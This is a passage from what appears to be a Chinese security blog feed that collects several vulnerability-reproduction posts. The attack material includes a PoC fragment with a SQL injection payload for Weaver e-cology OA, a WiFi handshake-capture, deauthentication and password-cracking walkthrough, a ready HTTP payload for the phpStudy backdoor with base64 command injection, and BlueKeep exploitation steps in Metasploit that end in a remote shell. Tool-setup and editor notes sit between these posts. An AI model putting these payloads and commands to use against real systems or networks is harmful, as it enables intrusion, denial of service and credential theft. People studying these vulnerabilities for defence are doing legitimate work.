&quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d&quot; \               &quot;%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a&quot; \               &quot;%0dunion select NULL,value from v$parameter order by (((1 &quot;        path = &quot;/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333&quot;        url = self.url + path        # print(url)        respose = requests.post(url, data=data, headers=headers, verify=False, timeout=60)        if respose.status_code == 200 and &quot;id&quot; in respose.text:  # result是返回结果            result[&#39;VerifyInfo&#39;] = {}            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url            # result[&#39;VerifyInfo&#39;][&#39;content&#39;] = respose.text        return self.parse_output(result)    def _attack(self):        # 攻击代码        return self._verify()    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail(&quot;Internet nothing returned&quot;)        return output# 注册 DemoPOC 类register_poc(DemoPOC)</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-34241" target="_blank" rel="noopener">泛微e-cology OA系统Wo***接口存在SQL注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 泛微e-cology OA </tag>
            
            <tag> 注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali抓包破解WIFI密码</title>
      <link href="/2019/09/30/kali-zhua-bao-po-jie-wifi-mi-ma/"/>
      <url>/2019/09/30/kali-zhua-bao-po-jie-wifi-mi-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>使用kali破解wifi密码，如果kali安装在虚拟机，需要一个外置usb网卡。</p><h1 id="0x02-开始"><a href="#0x02-开始" class="headerlink" title="0x02 开始"></a>0x02 开始</h1><h2 id="查看插入的网卡"><a href="#查看插入的网卡" class="headerlink" title="查看插入的网卡"></a>查看插入的网卡</h2><p>打开kali虚拟机，插入USB无线网卡，打开终端</p><p><code>iwconfig</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930115136.png" alt></p><h2 id="查看无线网卡"><a href="#查看无线网卡" class="headerlink" title="查看无线网卡"></a>查看无线网卡</h2><p><code>airmon-ng</code><br>上面命令列出了支持监控模式的无线网卡。如果没有任何输出，表示无线网卡不支持监控模式。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930115331.png" alt></p><h2 id="开启网卡监听模式-记录Interface名称-杀掉其他使用WiFi进程"><a href="#开启网卡监听模式-记录Interface名称-杀掉其他使用WiFi进程" class="headerlink" title="开启网卡监听模式,记录Interface名称,杀掉其他使用WiFi进程"></a>开启网卡监听模式,记录Interface名称,杀掉其他使用WiFi进程</h2><p><code>airmon-ng  start wlan0</code><br>如果有下图提示表示有其他网卡处于监控模式。<br>使用<br><code>airmon-ng check kill</code><br>结束其他使用WIFI进程<br>在执行<br><code>airmon-ng  start wlan0</code><br>记住interface名称。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930120244.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930131449.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930131600.png" alt></p><h2 id="扫描信号"><a href="#扫描信号" class="headerlink" title="扫描信号"></a>扫描信号</h2><p><code>airodump-ng wlan0mon</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930120326.png" alt></p><ul><li>BSSID是AP端的MAC地址</li><li>PWR是信号强度，数字越小越好</li><li>Data是对应的路由器的在线数据吞吐量，数字越大，数据上传量越大。</li><li>CH是对应路由器的所在信道</li><li>ESSID是对应路由器的名称</li></ul><p>找到目标后，<code>ctrl + c</code> 中止</p><h2 id="抓取握手包"><a href="#抓取握手包" class="headerlink" title="抓取握手包"></a>抓取握手包</h2><pre><code>airodump-ng -c 11 -w ./test --bssid 78:44:FD:83:0B:2C wlan0monairodump-ng -c &lt;AP的信道&gt; -w &lt;抓取握手包的存放位置名称&gt; --bssid &lt;AP的MAC地址&gt; &lt;你的的Interface名称&gt;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930133222.png" alt></p><h2 id="解除认证攻击"><a href="#解除认证攻击" class="headerlink" title="解除认证攻击"></a>解除认证攻击</h2><p>保持上一个terminal窗口的运行状态，打开一个新的terminal,进行解除认证攻击<br>强制连接到wifi的设备重新连接路由器，掉线设备重连后，如图所示位置显示<code>WPA handshake --</code>即成功抓取到握手包。<br>两个terminal使用<code>ctrl+c</code>终止攻击和握手抓包。</p><pre><code>aireplay-ng -0 0 -a 9C:A6:15:D0:04:C9 -c D8:32:E3:A7:B9:6F wlan0monaireplay-ng -&lt;攻击模式，我们这里使用 解除认证攻击(数字0)&gt; [攻击次数，0为无限攻击] -a &lt;AP端的MAC地址&gt; -c &lt;客户端端的MAC地址&gt; &lt;interface名称&gt;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930135405.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930135508.png" alt></p><h2 id="关闭无线网卡的监听模式"><a href="#关闭无线网卡的监听模式" class="headerlink" title="关闭无线网卡的监听模式"></a>关闭无线网卡的监听模式</h2><p><code>airmon-ng stop wlan0mon</code></p><h2 id="使用字典暴力破解"><a href="#使用字典暴力破解" class="headerlink" title="使用字典暴力破解"></a>使用字典暴力破解</h2><p>kali下自带一份无线密码字典 –&gt;<code>/usr/share/wordlists/rockyou.txt.gz</code><br>解压：<br><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p><pre><code>aircrack-ng  -w  /usr/share/wordlists/rockyou.txt  -b  BC:46:99:3D:66:D6 tplink-01.cap#-w指定 密码字典 -b指定路由器的MAC地址</code></pre><p>爆破成功后，如图区域位置显示<code>KEY FOUND!</code>字样，中括里为AP端的密码。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190930145120.png" alt></p><p>over！</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_21137441/article/details/88795079" target="_blank" rel="noopener">使用Aircrack-ng 工具进行WIFI的监听和破解 - 林中静月下仙的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> wifi </tag>
            
            <tag> 爆破 </tag>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpStudy后门漏洞复现</title>
      <link href="/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/"/>
      <url>/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>phpStudy是一款PHP调试环境的程序集成包，集成了最新的Apache、PHP、phpMyAdmin、<br>ZendOptimizer等多款软件一次性安装，无需配置，即装即用。由于其免费且方便的特性，<br>在国内有着近百万的PHP语言学习者、开发者用户。<br>最近杭州公安在<a href="https://mp.weixin.qq.com/s?__biz=MzA4MjM2MDgxMA==&mid=2815602999&idx=1&sn=b01cd1d8b2c50df48d4196400a3db8d9&chksm=bda0f1b28ad778a46f7cf77ec1ddf1488a063b183732735bc3808621d71765792213f8deb6fe&scene=21#wechat_redirect" target="_blank" rel="noopener">“杭州警方通报打击涉网违法犯罪暨“净网2019”专项行动战果”</a>一文中提到:</p><blockquote><p>Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer<br>多款软件一次性安装，无需配置即可直接安装使用，具有PHP环境调试和PHP开发功能，在国内有着近百万PHP语言学习者、开发者用户。<br>正是这样一款公益性软件，2018年12月4日，西湖区公安分局网警大队接报案称，某公司发现公司内有20余台计算机被执行危险命令，<br>疑似远程控制抓取账号密码等计算机数据 回传大量敏感信息。<br>据统计，截止抓获时间，犯罪嫌疑人共非法控制计算机67万余台，非法获取账号密码类、聊天数据类、设备码类等数据10万余组，<br>非法牟利共计600余万元。</p></blockquote><p>令人震惊的同时，想想自己电脑上还下的有好几个版本的phpstudy，根据大佬的思路复现一波，踩了几个特别坑的坑。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><ul><li>phpStudy2016<br>  <code>php\php-5.2.17\ext\php_xmlrpc.dll</code><br>  <code>php\php-5.4.45\ext\php_xmlrpc.dll</code></li><li>phpStudy2018<br>  <code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</code><br>  <code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code></li></ul><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h2><p>win10+phpStudy 2018(php-5.4.45+Apache)<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924232920.png" alt></p><h2 id="后门验证："><a href="#后门验证：" class="headerlink" title="后门验证："></a>后门验证：</h2><p>用记事本或者Notepad++打开phpstudy安装目录下的：</p><p><code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code></p><p>存在<code>@eval(%s(&#39;%s&#39;));</code>即说明有后门。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924233404.png" alt></p><h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><h3 id="BP抓包复现"><a href="#BP抓包复现" class="headerlink" title="BP抓包复现"></a>BP抓包复现</h3><p>直接访问首页抓包</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924234029.png" alt></p><p>在请求头里构造 <code>Accept-Encoding</code> 和 <code>accept-charset</code> 即可。</p><p> <code>Accept-Encoding</code> 已经有了，但是这里注意：<br> <strong>要把<code>gzip, deflate</code>  里逗号后面的空格去掉，不然命令执行不成功。</strong></p><p> <img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190924235906.png" alt></p><p>然后在请求头里添加 <code>accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==</code><br><code>Accept-Charset</code> 的值就是执行的命令，默认是<code>system(&#39;net user&#39;);</code><br>如果想要执行其他命令，直接去把命令进行base64编码替换即可！</p><p><strong>最后注意，要保证有请求体，只有请求头会一直卡在Waiting，最后返回超时。<br>在请求头最后，至少敲两下回车，然后留空或者随便添加点什么。</strong></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000134.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000651.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190925000852.png" alt></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre><code>GET / HTTP/1.1Host: 192.168.1.12Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==Accept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,und;q=0.5,pt;q=0.4,zh-TW;q=0.3,lb;q=0.2,fr;q=0.1,ca;q=0.1,ja;q=0.1,mt;q=0.1,de;q=0.1,vi;q=0.1,pl;q=0.1,tr;q=0.1,nb;q=0.1,es;q=0.1Connection: closeContent-Length: 2</code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> phpstudy </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16 源码搭建 IVRE</title>
      <link href="/2019/09/21/yuan-ma-da-jian-ivre/"/>
      <url>/2019/09/21/yuan-ma-da-jian-ivre/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>IVRE(又名DRUNK)是一款开源的网络侦查框架工具，IVRE使用Nmap、Zmap进行主动网络探测，<br>使用Bro、P0f等进行网络流量被动分析，探测结果存入数据库中，方便数据的查询、分类汇总统计。<br>网上大多都是使用Docker进行安装，配置便捷，不会遇到太多问题，但有时候特殊需求需要用源码<br>进行安装，特此记录一下。<br>可以参考官方文档：<a href="https://doc.ivre.rocks/en/latest/overview/index.html" target="_blank" rel="noopener">Overview — IVRE documentation</a><br>Github：<a href="https://github.com/cea-sec/ivre" target="_blank" rel="noopener">ivre: Network recon framework.</a></p><h1 id="0x02-Install-amp-Setup"><a href="#0x02-Install-amp-Setup" class="headerlink" title="0x02 Install&amp;Setup"></a>0x02 Install&amp;Setup</h1><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>安装需要的服务器数据库<br><code>sudo apt-get -y install mongodb python-pymongo python-crypto \</code><br><code>python-future python-bottle apache2 libapache2-mod-wsgi dokuwiki</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921161300.png" alt></p><p>下载源码<br><code>git clone https://github.com/cea-sec/ivre</code></p><p>源码安装<br>（推荐用Python2，Python3踩坑见文末）<br><code>cd ivre</code><br><code>python3 setup.py build</code><br><code>sudo python3 setup.py install</code></p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><pre><code>$ sudo -s# cd /var/www/html ## or depending on your version /var/www# rm index.html# ln -s /usr/local/share/ivre/web/static/* .# cd /var/lib/dokuwiki/data/pages# ln -s /usr/local/share/ivre/dokuwiki/doc# cd /var/lib/dokuwiki/data/media# ln -s /usr/local/share/ivre/dokuwiki/media/logo.png# ln -s /usr/local/share/ivre/dokuwiki/media/doc# cd /usr/share/dokuwiki# patch -p0 &lt; /usr/local/share/ivre/dokuwiki/backlinks.patch# cd /etc/apache2/mods-enabled# for m in rewrite.load wsgi.conf wsgi.load ; do&gt;   [ -L $m ] || ln -s ../mods-available/$m ; done# cd ../# echo &#39;Alias /cgi &quot;/usr/local/share/ivre/web/wsgi/app.wsgi&quot;&#39; &gt; conf-enabled/ivre.conf# echo &#39;&lt;Location /cgi&gt;&#39; &gt;&gt; conf-enabled/ivre.conf# echo &#39;SetHandler wsgi-script&#39; &gt;&gt; conf-enabled/ivre.conf# echo &#39;Options +ExecCGI&#39; &gt;&gt; conf-enabled/ivre.conf# echo &#39;Require all granted&#39; &gt;&gt; conf-enabled/ivre.conf# echo &#39;&lt;/Location&gt;&#39; &gt;&gt; conf-enabled/ivre.conf# sed -i &#39;s/^\(\s*\)#Rewrite/\1Rewrite/&#39; /etc/dokuwiki/apache.conf# echo &#39;WEB_GET_NOTEPAD_PAGES = &quot;localdokuwiki&quot;&#39; &gt;&gt; /etc/ivre.conf# service apache2 reload  ## or start# exit</code></pre><p>完成后，访问<a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a>,服务器访问ip，即可看到WEB UI</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921163114.png" alt></p><p>如果搭建在服务器上，记得点击help，查看是否正常工作。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921164623.png" alt></p><p>如果显示 <code>Forbidden</code>,使用如下命令修改配置文件<br><code>vim /etc/dokuwiki/apache.conf</code><br>将<br><code>Allow from localhost 127.0.0.1 ::1</code><br>修改为：</p><pre><code>#Allow from localhost 127.0.0.1 ::1Allow from all</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921165037.png" alt></p><h1 id="0x03-Database-init-data-download-amp-importation"><a href="#0x03-Database-init-data-download-amp-importation" class="headerlink" title="0x03 Database init, data download &amp; importation"></a>0x03 Database init, data download &amp; importation</h1><p>这一步时间有点长，耐心等待</p><pre><code>$ yes | ivre ipinfo --init$ yes | ivre scancli --init$ yes | ivre view --init$ yes | ivre flowcli --init$ yes | sudo ivre runscansagentdb --init$ sudo ivre ipdata --download --import-all</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921203152.png" alt></p><h1 id="0x04-Run-a-first-scan"><a href="#0x04-Run-a-first-scan" class="headerlink" title="0x04 Run a first scan"></a>0x04 Run a first scan</h1><h2 id="Against-1k-routable-IP-addresses-with-a-single-nmap-process"><a href="#Against-1k-routable-IP-addresses-with-a-single-nmap-process" class="headerlink" title="Against 1k (routable) IP addresses, with a single nmap process:"></a>Against 1k (routable) IP addresses, with a single nmap process:</h2><p><code>sudo ivre runscans --routable --limit 200</code></p><p>如果报如下错误：</p><pre><code>nmap: unrecognized option &#39;--script-timeout&#39;ADDING TARGET 1 : 120.75.39.145ERROR: NMAP PROCESS IS DEAD</code></pre><p>或者</p><pre><code>Traceback (most recent call last):  File &quot;/usr/local/bin/ivre&quot;, line 84, in &lt;module&gt;    main()  File &quot;/usr/local/bin/ivre&quot;, line 56, in main    tools.get_command(next(iter(possible_commands)))()  File &quot;/usr/local/lib/python2.7/dist-packages/ivre/tools/runscans.py&quot;, line 498, in main    accept_target_status=accept_target_status)  File &quot;/usr/local/lib/python2.7/dist-packages/ivre/tools/runscans.py&quot;, line 217, in call_nmap    stdin=subprocess.PIPE, stdout=subprocess.PIPE)  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 711, in __init__    errread, errwrite)  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 1343, in _execute_child    raise child_exceptionOSError: [Errno 2] No such file or directory</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190920111226.png" alt></p><p>因为 nmap未安装或者版本过低，Nmap Debian 版本可能比当前的版本晚一年甚至更长的时间<br>下载最新 RPM 格式的 nmap 包，然后使用 alien 工具把他转换成 debian 包，再用 dpkg 工具安装即可。</p><p>步骤如下：</p><ul><li>先卸载已安装的nmap<br><code>sudo apt remove nmap -y</code></li><li>安装 alien<br><code>sudo apt-get install alien</code></li><li>使用wget下载  <a href="https://nmap.org/download.html" target="_blank" rel="noopener">Nmap RPMs</a><br><code>wget https://nmap.org/dist/nmap-7.80-1.x86_64.rpm</code></li><li>转化<br><code>sudo alien nmap-7.80-1.x86_64.rpm</code></li><li>安装<br><code>sudo dpkg --install nmap_7.80-2_amd64.deb</code></li></ul><h2 id="import-the-results-and-create-a-view"><a href="#import-the-results-and-create-a-view" class="headerlink" title="import the results and create a view"></a>import the results and create a view</h2><pre><code>$ ivre scan2db -c ROUTABLE,ROUTABLE-CAMPAIGN-001 -s MySource -r \&gt;              scans/ROUTABLE/up$ ivre db2view nmap</code></pre><p>返回Web UI，刷新即可查看扫描结果。</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190921213155.png" alt></p><h2 id="WEB-UI-没有数据"><a href="#WEB-UI-没有数据" class="headerlink" title="WEB-UI 没有数据"></a>WEB-UI 没有数据</h2><p>安装好后，数据导入了数据库，web-ui界面一直显示Conuting，没有数据</p><p><code>cat /var/log/apache2/error.log</code></p><p>查看apache错误日志，发现<br>使用的是Python3 安装的，但是它会调用Python2，所以报错<br>解决办法是</p><p>直接卸载python2，<br>或者<br>使用python2来安装IVRE。</p><p>如果还不出来，再查看apache错误日志，根据报错来改，可能缺少模块。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mstajbakhsh.ir/ivre-drunk-frenchman-port-scanner-framework/" target="_blank" rel="noopener">IVRE! Drunk Frenchman Port Scanner Framework!</a><br><a href="https://doc.ivre.rocks/en/latest/overview/index.html" target="_blank" rel="noopener">Overview — IVRE documentation</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu16 </tag>
            
            <tag> 源码 </tag>
            
            <tag> IVRE </tag>
            
            <tag> 网络侦查框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-0708远程桌面代码执行漏洞复现</title>
      <link href="/2019/09/07/cve-2019-0708-yuan-cheng-zhuo-mian-dai-ma-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/09/07/cve-2019-0708-yuan-cheng-zhuo-mian-dai-ma-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广如：windows2003、windows2008、windows2008 R2、windows xp系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。如果被攻击者利用，会导致服务器入侵，中病毒，像WannaCry 永恒之蓝漏洞一样大规模的感染。</p><p>2019年9月7日晚上凌晨1点左右，metaspolit更新了漏洞利用程序。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>该漏洞影响旧版本的Windows系统，包括：<br>Windows 7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP</p><p>Windows 8和Windows 10及之后版本不受此漏洞影响。</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>本地使用<code>VMware Workstation Pro 15</code> 安装 <code>win7_x64 SP1</code><br>并设置 允许任何人远程桌面连接<br>附上 Windows7 SP1下载链接</p><p><code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908214611.png" alt></p><h3 id="攻击机KALI"><a href="#攻击机KALI" class="headerlink" title="攻击机KALI"></a>攻击机KALI</h3><p>替换所需要的文件<br>Kali在Terminal下执行如下命令进行替换：</p><pre><code>wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/</code></pre><p>msf升级到5</p><p><code>apt install metasploit-framework</code></p><p>进入msf,并重新加载利用模块</p><p><code>msfconsole</code><br><code>reload_all</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908215218.png" alt></p><p>使用 <strong>0708RDP</strong> 攻击模块,并设置参数</p><pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rceset RHOSTS 192.168.134.133set target 3exploit</code></pre><p>target是主机架构选择的意思，一定要选对，<br>vm装的win7sp1话，先试2，再试3，本文使用1也测试成功,建议试一次重启靶机一次。<br>选错架构会导致蓝屏、利用失败等问题</p><p>如果报如下错误:</p><pre><code>Exploit failed: NameError undefined local variable or method `rdp_connect&#39; for #&lt;Msf::Modules::Exploit__Rdp__Cve_2019_0708_bluekeep_rce::MetasploitModule:0x00007fd83f439260&gt;Did you mean?  disconnect[*] Exploit completed, but no session was created.</code></pre><p>一般是<code>rdp.rb</code>没替换或者放错位置了,重新替换即可</p><p>建立连接以后,使用<code>shell</code>获得shell<br>再使用<code>python</code>获得交互式shell</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908220553.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190908220636.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961" target="_blank" rel="noopener">CVE-2019-0708远程桌面代码执行漏洞复现 - Qiita</a><br><a href="https://www.cnblogs.com/backlion/p/11482322.html?from=timeline" target="_blank" rel="noopener">Windows RDP的RCE漏洞分析和复现（CVE-2019-0708）</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> CVE-2019-0708 </tag>
            
            <tag> RDP </tag>
            
            <tag> 3389 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime Text3使用指南</title>
      <link href="/2019/08/31/sublime-text3-shi-yong-zhi-nan/"/>
      <url>/2019/08/31/sublime-text3-shi-yong-zhi-nan/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>sublime是一款轻便、快捷的编辑器，好处多多，<br>只不过配置起来麻烦了点，所有在此记录一下自用配置。<br>（本文默认环境为window 10）</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190831220729.png" alt></p><h1 id="0x02-下载"><a href="#0x02-下载" class="headerlink" title="0x02 下载"></a>0x02 下载</h1><p><a href="https://www.sublimetext.com/" target="_blank" rel="noopener">官网</a>直达,下载安装即可</p><h1 id="0x03-使用技巧"><a href="#0x03-使用技巧" class="headerlink" title="0x03 使用技巧"></a>0x03 使用技巧</h1><h2 id="启用VIM模式"><a href="#启用VIM模式" class="headerlink" title="启用VIM模式"></a>启用VIM模式</h2><p>在<code>Preferences -&gt; Setting - User</code>中将<br><code>ignored_packages</code> 的值注释掉</p><p>因为<code>Ctrl+f</code> 